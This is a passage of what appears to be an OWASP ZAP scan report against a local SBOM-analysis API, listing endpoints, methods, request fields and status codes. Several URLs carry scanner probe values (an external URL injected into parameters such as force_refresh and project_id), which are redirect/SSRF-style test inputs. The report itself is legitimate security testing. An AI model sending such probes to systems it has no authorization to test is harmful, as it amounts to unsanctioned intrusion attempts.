  * Node Name: `http://host.docker.internal:8000/api/sboms/10/schedule ()({cadence,cron_expression,day_of_week,day_of_month,hour_utc,timezone,enabled,min_gap_minutes,modified_by})`
  * Method: `PATCH`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/schedule/
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/schedule/ ()({cadence,cron_expression,day_of_week,day_of_month,hour_utc,timezone,enabled,min_gap_minutes,modified_by})`
  * Method: `PATCH`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/tenants/10/users/10
  * Node Name: `http://host.docker.internal:8000/api/tenants/10/users/10 ()({role,status})`
  * Method: `PATCH`
  * Parameter: ``
  * Attack: ``
  * Evidence: `403`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/tenants/10/users/10/
  * Node Name: `http://host.docker.internal:8000/api/tenants/10/users/10/ ()({role,status})`
  * Method: `PATCH`
  * Parameter: ``
  * Attack: ``
  * Evidence: `403`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/validation-sessions/session_id
  * Node Name: `http://host.docker.internal:8000/api/validation-sessions/session_id ()({current_content,project_id})`
  * Method: `PATCH`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/validation-sessions/session_id
  * Node Name: `http://host.docker.internal:8000/api/validation-sessions/session_id ()({current_content,project_id})`
  * Method: `PATCH`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/validation-sessions/session_id/
  * Node Name: `http://host.docker.internal:8000/api/validation-sessions/session_id/ ()({current_content,project_id})`
  * Method: `PATCH`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/analyze-sbom-consolidated
  * Node Name: `http://host.docker.internal:8000/analyze-sbom-consolidated ()({sbom_id,sbom_name,results_per_page,first,osv_hydrate})`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/analyze-sbom-consolidated
  * Node Name: `http://host.docker.internal:8000/analyze-sbom-consolidated ()({sbom_id,sbom_name,results_per_page,first,osv_hydrate})`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/analyze-sbom-consolidated
  * Node Name: `http://host.docker.internal:8000/analyze-sbom-consolidated ()({sbom_id,sbom_name,results_per_page,first,osv_hydrate})`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `429`
  * Other Info: ``
* URL: http://host.docker.internal:8000/analyze-sbom-consolidated/
  * Node Name: `http://host.docker.internal:8000/analyze-sbom-consolidated/ ()({sbom_id,sbom_name,results_per_page,first,osv_hydrate})`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `429`
  * Other Info: ``
* URL: http://host.docker.internal:8000/analyze-sbom-github
  * Node Name: `http://host.docker.internal:8000/analyze-sbom-github ()({sbom_id,sbom_name,first})`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/analyze-sbom-github
  * Node Name: `http://host.docker.internal:8000/analyze-sbom-github ()({sbom_id,sbom_name,first})`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/analyze-sbom-github
  * Node Name: `http://host.docker.internal:8000/analyze-sbom-github ()({sbom_id,sbom_name,first})`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `429`
  * Other Info: ``
* URL: http://host.docker.internal:8000/analyze-sbom-github/
  * Node Name: `http://host.docker.internal:8000/analyze-sbom-github/ ()({sbom_id,sbom_name,first})`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `429`
  * Other Info: ``
* URL: http://host.docker.internal:8000/analyze-sbom-nvd
  * Node Name: `http://host.docker.internal:8000/analyze-sbom-nvd ()({sbom_id,sbom_name,results_per_page})`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/analyze-sbom-nvd
  * Node Name: `http://host.docker.internal:8000/analyze-sbom-nvd ()({sbom_id,sbom_name,results_per_page})`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/analyze-sbom-nvd
  * Node Name: `http://host.docker.internal:8000/analyze-sbom-nvd ()({sbom_id,sbom_name,results_per_page})`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `429`
  * Other Info: ``
* URL: http://host.docker.internal:8000/analyze-sbom-nvd/
  * Node Name: `http://host.docker.internal:8000/analyze-sbom-nvd/ ()({sbom_id,sbom_name,results_per_page})`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `429`
  * Other Info: ``
* URL: http://host.docker.internal:8000/analyze-sbom-osv
  * Node Name: `http://host.docker.internal:8000/analyze-sbom-osv ()({sbom_id,sbom_name,hydrate})`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/analyze-sbom-osv
  * Node Name: `http://host.docker.internal:8000/analyze-sbom-osv ()({sbom_id,sbom_name,hydrate})`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/analyze-sbom-osv
  * Node Name: `http://host.docker.internal:8000/analyze-sbom-osv ()({sbom_id,sbom_name,hydrate})`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `429`
  * Other Info: ``
* URL: http://host.docker.internal:8000/analyze-sbom-osv/
  * Node Name: `http://host.docker.internal:8000/analyze-sbom-osv/ ()({sbom_id,sbom_name,hydrate})`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `429`
  * Other Info: ``
* URL: http://host.docker.internal:8000/analyze-sbom-vulndb
  * Node Name: `http://host.docker.internal:8000/analyze-sbom-vulndb ()({sbom_id,sbom_name})`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `400`
  * Other Info: ``
* URL: http://host.docker.internal:8000/analyze-sbom-vulndb
  * Node Name: `http://host.docker.internal:8000/analyze-sbom-vulndb ()({sbom_id,sbom_name})`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/analyze-sbom-vulndb
  * Node Name: `http://host.docker.internal:8000/analyze-sbom-vulndb ()({sbom_id,sbom_name})`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `429`
  * Other Info: ``
* URL: http://host.docker.internal:8000/analyze-sbom-vulndb/
  * Node Name: `http://host.docker.internal:8000/analyze-sbom-vulndb/ ()({sbom_id,sbom_name})`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `429`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/admin/lifecycle-providers/provider_key/sync
  * Node Name: `http://host.docker.internal:8000/api/admin/lifecycle-providers/provider_key/sync`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/admin/lifecycle-providers/provider_key/sync/
  * Node Name: `http://host.docker.internal:8000/api/admin/lifecycle-providers/provider_key/sync/`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/admin/lifecycle-providers/provider_key/test
  * Node Name: `http://host.docker.internal:8000/api/admin/lifecycle-providers/provider_key/test`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/admin/lifecycle-providers/provider_key/test/
  * Node Name: `http://host.docker.internal:8000/api/admin/lifecycle-providers/provider_key/test/`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/admin/lifecycle-vendor-records
  * Node Name: `http://host.docker.internal:8000/api/admin/lifecycle-vendor-records ()({vendor_name,product_name,product_aliases:[],ecosystem,version_pattern,version_start,version_end,lifecycle_status,maintenance_status,eol_date,eos_date,eof_date,deprecated,unsupported,latest_supported_version,recommended_version,evidence_url,evidence:{},confidence,enabled})`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/admin/lifecycle-vendor-records/
  * Node Name: `http://host.docker.internal:8000/api/admin/lifecycle-vendor-records/ ()({vendor_name,product_name,product_aliases:[],ecosystem,version_pattern,version_start,version_end,lifecycle_status,maintenance_status,eol_date,eos_date,eof_date,deprecated,unsupported,latest_supported_version,recommended_version,evidence_url,evidence:{},confidence,enabled})`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/ai/copilot/ask
  * Node Name: `http://host.docker.internal:8000/api/ai/copilot/ask ()({question})`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/components/10/lifecycle/refresh%3Fforce=http%253A%252F%252Fwww.google.com%252F
  * Node Name: `http://host.docker.internal:8000/api/components/10/lifecycle/refresh (force)`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/pdf-report
  * Node Name: `http://host.docker.internal:8000/api/pdf-report ()({runId,title,filename})`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/pdf-report
  * Node Name: `http://host.docker.internal:8000/api/pdf-report ()({runId,title,filename})`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/pdf-report/
  * Node Name: `http://host.docker.internal:8000/api/pdf-report/ ()({runId,title,filename})`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/products/10/schedule
  * Node Name: `http://host.docker.internal:8000/api/products/10/schedule ()({cadence,cron_expression,day_of_week,day_of_month,hour_utc,timezone,enabled,min_gap_minutes,modified_by})`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/products/10/schedule/
  * Node Name: `http://host.docker.internal:8000/api/products/10/schedule/ ()({cadence,cron_expression,day_of_week,day_of_month,hour_utc,timezone,enabled,min_gap_minutes,modified_by})`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/projects
  * Node Name: `http://host.docker.internal:8000/api/projects ()({project_name,project_details,project_status,created_by})`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `400`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/projects/10/products
  * Node Name: `http://host.docker.internal:8000/api/projects/10/products ()({"name":"ZAP","description":Zaproxy alias impedit expedita quisquam pariatur exercitationem. Nemo rerum eveniet dolores rem quia dignissimos.,"product_key":"John Doe","vendor":"John Doe","category":"John Doe","status":"John Doe","latest_version":"John Doe","metadata_json":{}})`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/projects/10/products/
  * Node Name: `http://host.docker.internal:8000/api/projects/10/products/ ()({"name":"ZAP","description":Zaproxy alias impedit expedita quisquam pariatur exercitationem. Nemo rerum eveniet dolores rem quia dignissimos.,"product_key":"John Doe","vendor":"John Doe","category":"John Doe","status":"John Doe","latest_version":"John Doe","metadata_json":{}})`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/projects/10/reports/fda-510k-sbom/export
  * Node Name: `http://host.docker.internal:8000/api/projects/10/reports/fda-510k-sbom/export ()({selections:[{sbom_id,findings_analysis_run_id,lifecycle_analysis_run_id}],metadata:{device_name,device_model_catalog_number,manufacturer_sponsor,submission_type,submission_number,product_code_regulation_number,device_software_version,top_level_primary_component,author_of_sbom_data,sbom_version,sbom_formats_for_submission,sbom_generation_tool_and_version,primary_data_source,prepared_by,date_prepared,reviewed_approved_by,date_approved}})`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `400`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/projects/10/reports/fda-510k-sbom/export
  * Node Name: `http://host.docker.internal:8000/api/projects/10/reports/fda-510k-sbom/export ()({selections:[{sbom_id,findings_analysis_run_id,lifecycle_analysis_run_id}],metadata:{device_name,device_model_catalog_number,manufacturer_sponsor,submission_type,submission_number,product_code_regulation_number,device_software_version,top_level_primary_component,author_of_sbom_data,sbom_version,sbom_formats_for_submission,sbom_generation_tool_and_version,primary_data_source,prepared_by,date_prepared,reviewed_approved_by,date_approved}})`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/projects/10/reports/fda-510k-sbom/export/
  * Node Name: `http://host.docker.internal:8000/api/projects/10/reports/fda-510k-sbom/export/ ()({selections:[{sbom_id,findings_analysis_run_id,lifecycle_analysis_run_id}],metadata:{device_name,device_model_catalog_number,manufacturer_sponsor,submission_type,submission_number,product_code_regulation_number,device_software_version,top_level_primary_component,author_of_sbom_data,sbom_version,sbom_formats_for_submission,sbom_generation_tool_and_version,primary_data_source,prepared_by,date_prepared,reviewed_approved_by,date_approved}})`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `400`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/projects/10/restore%3Fuser_id=
  * Node Name: `http://host.docker.internal:8000/api/projects/10/restore (user_id)`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/projects/10/schedule
  * Node Name: `http://host.docker.internal:8000/api/projects/10/schedule ()({cadence,cron_expression,day_of_week,day_of_month,hour_utc,timezone,enabled,min_gap_minutes,modified_by})`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/projects/10/schedule/
  * Node Name: `http://host.docker.internal:8000/api/projects/10/schedule/ ()({cadence,cron_expression,day_of_week,day_of_month,hour_utc,timezone,enabled,min_gap_minutes,modified_by})`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/remediation
  * Node Name: `http://host.docker.internal:8000/api/remediation ()({vuln_id,component_name,component_version,fixed_version,status,owner,due_date,resolution_date,fix_notes})`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/remediation%3Fproject_id=10&user_id=
  * Node Name: `http://host.docker.internal:8000/api/remediation (project_id,user_id)({vuln_id,component_name,component_version,fixed_version,status,owner,due_date,resolution_date,fix_notes})`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `400`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/remediation%3Fproject_id=http%253A%252F%252Fwww.google.com%252F&user_id=
  * Node Name: `http://host.docker.internal:8000/api/remediation (project_id,user_id)({vuln_id,component_name,component_version,fixed_version,status,owner,due_date,resolution_date,fix_notes})`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/remediation/
  * Node Name: `http://host.docker.internal:8000/api/remediation/ ()({vuln_id,component_name,component_version,fixed_version,status,owner,due_date,resolution_date,fix_notes})`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sbom-validation-sessions/session_id/ai/suggest-fixes
  * Node Name: `http://host.docker.internal:8000/api/sbom-validation-sessions/session_id/ai/suggest-fixes ()({user_instruction})`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sbom-validation-sessions/session_id/ai/suggest-fixes/
  * Node Name: `http://host.docker.internal:8000/api/sbom-validation-sessions/session_id/ai/suggest-fixes/ ()({user_instruction})`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sbom-validation-sessions/session_id/apply-patch
  * Node Name: `http://host.docker.internal:8000/api/sbom-validation-sessions/session_id/apply-patch ()({patches:[{}]})`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sbom-validation-sessions/session_id/apply-patch%3Fstrict_ntia=false&verify_signature=false
  * Node Name: `http://host.docker.internal:8000/api/sbom-validation-sessions/session_id/apply-patch (strict_ntia,verify_signature)({patches:[{}]})`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sbom-validation-sessions/session_id/apply-patch%3Fstrict_ntia=http%253A%252F%252Fwww.google.com%252F&verify_signature=false
  * Node Name: `http://host.docker.internal:8000/api/sbom-validation-sessions/session_id/apply-patch (strict_ntia,verify_signature)({patches:[{}]})`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sbom-validation-sessions/session_id/apply-patch/
  * Node Name: `http://host.docker.internal:8000/api/sbom-validation-sessions/session_id/apply-patch/ ()({patches:[{}]})`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sbom-validation-sessions/session_id/import
  * Node Name: `http://host.docker.internal:8000/api/sbom-validation-sessions/session_id/import`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sbom-validation-sessions/session_id/import%3Fstrict_ntia=false&verify_signature=false&project_required=false
  * Node Name: `http://host.docker.internal:8000/api/sbom-validation-sessions/session_id/import (project_required,strict_ntia,verify_signature)`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sbom-validation-sessions/session_id/import%3Fstrict_ntia=http%253A%252F%252Fwww.google.com%252F&verify_signature=false&project_required=false
  * Node Name: `http://host.docker.internal:8000/api/sbom-validation-sessions/session_id/import (project_required,strict_ntia,verify_signature)`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sbom-validation-sessions/session_id/import/
  * Node Name: `http://host.docker.internal:8000/api/sbom-validation-sessions/session_id/import/`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sbom-validation-sessions/session_id/repair/patches
  * Node Name: `http://host.docker.internal:8000/api/sbom-validation-sessions/session_id/repair/patches ()({patches:[{}]})`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sbom-validation-sessions/session_id/repair/patches/
  * Node Name: `http://host.docker.internal:8000/api/sbom-validation-sessions/session_id/repair/patches/ ()({patches:[{}]})`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sbom-validation-sessions/session_id/revalidate
  * Node Name: `http://host.docker.internal:8000/api/sbom-validation-sessions/session_id/revalidate`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sbom-validation-sessions/session_id/revalidate%3Fstrict_ntia=false&verify_signature=false
  * Node Name: `http://host.docker.internal:8000/api/sbom-validation-sessions/session_id/revalidate (strict_ntia,verify_signature)`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sbom-validation-sessions/session_id/revalidate%3Fstrict_ntia=http%253A%252F%252Fwww.google.com%252F&verify_signature=false
  * Node Name: `http://host.docker.internal:8000/api/sbom-validation-sessions/session_id/revalidate (strict_ntia,verify_signature)`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sbom-validation-sessions/session_id/revalidate/
  * Node Name: `http://host.docker.internal:8000/api/sbom-validation-sessions/session_id/revalidate/`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sbom-validation-sessions/session_id/validate
  * Node Name: `http://host.docker.internal:8000/api/sbom-validation-sessions/session_id/validate`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sbom-validation-sessions/session_id/validate%3Fstrict_ntia=false&verify_signature=false
  * Node Name: `http://host.docker.internal:8000/api/sbom-validation-sessions/session_id/validate (strict_ntia,verify_signature)`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sbom-validation-sessions/session_id/validate%3Fstrict_ntia=http%253A%252F%252Fwww.google.com%252F&verify_signature=false
  * Node Name: `http://host.docker.internal:8000/api/sbom-validation-sessions/session_id/validate (strict_ntia,verify_signature)`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sbom-validation-sessions/session_id/validate/
  * Node Name: `http://host.docker.internal:8000/api/sbom-validation-sessions/session_id/validate/`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sbom-workspaces/session_id/ai/suggest-fixes
  * Node Name: `http://host.docker.internal:8000/api/sbom-workspaces/session_id/ai/suggest-fixes ()({user_instruction})`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sbom-workspaces/session_id/ai/suggest-fixes/
  * Node Name: `http://host.docker.internal:8000/api/sbom-workspaces/session_id/ai/suggest-fixes/ ()({user_instruction})`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sbom-workspaces/session_id/apply-patch
  * Node Name: `http://host.docker.internal:8000/api/sbom-workspaces/session_id/apply-patch ()({patches:[]})`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sbom-workspaces/session_id/apply-patch%3Fstrict_ntia=false&verify_signature=false
  * Node Name: `http://host.docker.internal:8000/api/sbom-workspaces/session_id/apply-patch (strict_ntia,verify_signature)({patches:[]})`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sbom-workspaces/session_id/apply-patch/
  * Node Name: `http://host.docker.internal:8000/api/sbom-workspaces/session_id/apply-patch/ ()({patches:[]})`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sbom-workspaces/session_id/import
  * Node Name: `http://host.docker.internal:8000/api/sbom-workspaces/session_id/import`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sbom-workspaces/session_id/import%3Fstrict_ntia=false&verify_signature=false&project_required=false
  * Node Name: `http://host.docker.internal:8000/api/sbom-workspaces/session_id/import (project_required,strict_ntia,verify_signature)`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sbom-workspaces/session_id/import%3Fstrict_ntia=http%253A%252F%252Fwww.google.com%252F&verify_signature=false&project_required=false
  * Node Name: `http://host.docker.internal:8000/api/sbom-workspaces/session_id/import (project_required,strict_ntia,verify_signature)`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sbom-workspaces/session_id/import/
  * Node Name: `http://host.docker.internal:8000/api/sbom-workspaces/session_id/import/`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sbom-workspaces/session_id/repair/patches
  * Node Name: `http://host.docker.internal:8000/api/sbom-workspaces/session_id/repair/patches ()({patches:[]})`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sbom-workspaces/session_id/repair/patches/
  * Node Name: `http://host.docker.internal:8000/api/sbom-workspaces/session_id/repair/patches/ ()({patches:[]})`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sbom-workspaces/session_id/revalidate
  * Node Name: `http://host.docker.internal:8000/api/sbom-workspaces/session_id/revalidate`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sbom-workspaces/session_id/revalidate%3Fstrict_ntia=false&verify_signature=false
  * Node Name: `http://host.docker.internal:8000/api/sbom-workspaces/session_id/revalidate (strict_ntia,verify_signature)`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sbom-workspaces/session_id/revalidate%3Fstrict_ntia=http%253A%252F%252Fwww.google.com%252F&verify_signature=false
  * Node Name: `http://host.docker.internal:8000/api/sbom-workspaces/session_id/revalidate (strict_ntia,verify_signature)`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sbom-workspaces/session_id/revalidate/
  * Node Name: `http://host.docker.internal:8000/api/sbom-workspaces/session_id/revalidate/`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sbom-workspaces/session_id/validate
  * Node Name: `http://host.docker.internal:8000/api/sbom-workspaces/session_id/validate`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sbom-workspaces/session_id/validate%3Fstrict_ntia=false&verify_signature=false
  * Node Name: `http://host.docker.internal:8000/api/sbom-workspaces/session_id/validate (strict_ntia,verify_signature)`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sbom-workspaces/session_id/validate%3Fstrict_ntia=http%253A%252F%252Fwww.google.com%252F&verify_signature=false
  * Node Name: `http://host.docker.internal:8000/api/sbom-workspaces/session_id/validate (strict_ntia,verify_signature)`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sbom-workspaces/session_id/validate/
  * Node Name: `http://host.docker.internal:8000/api/sbom-workspaces/session_id/validate/`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms
  * Node Name: `http://host.docker.internal:8000/api/sboms ()({sbom_name,sbom_data,sbom_type,projectid,product_id,sbom_version,created_by,productver})`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms
  * Node Name: `http://host.docker.internal:8000/api/sboms ()({sbom_name,sbom_data,sbom_type,projectid,product_id,sbom_version,created_by,productver})`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/
  * Node Name: `http://host.docker.internal:8000/api/sboms/ ()({sbom_name,sbom_data,sbom_type,projectid,product_id,sbom_version,created_by,productver})`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/analyze
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/analyze`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/analyze%3Fforce_refresh=false
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/analyze (force_refresh)`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/analyze%3Fforce_refresh=http%253A%252F%252Fwww.google.com%252F
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/analyze (force_refresh)`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
